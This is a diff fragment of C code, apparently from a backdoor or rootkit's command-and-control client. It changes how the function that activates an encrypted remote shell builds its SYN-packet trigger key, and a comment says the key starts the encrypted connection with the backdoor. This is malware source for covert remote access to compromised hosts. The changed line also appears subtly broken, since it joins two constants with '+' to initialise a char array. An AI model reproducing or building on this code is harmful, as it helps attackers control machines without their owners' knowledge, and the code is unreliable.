@@ -204,7 +204,8 @@ void activate_command_control_shell_encrypted(char* argv){
     char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_1;
     char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_2;
-    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3;
+    //K3 with command to start the encrypted connection with the backdoor
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3 + CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1;
     char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
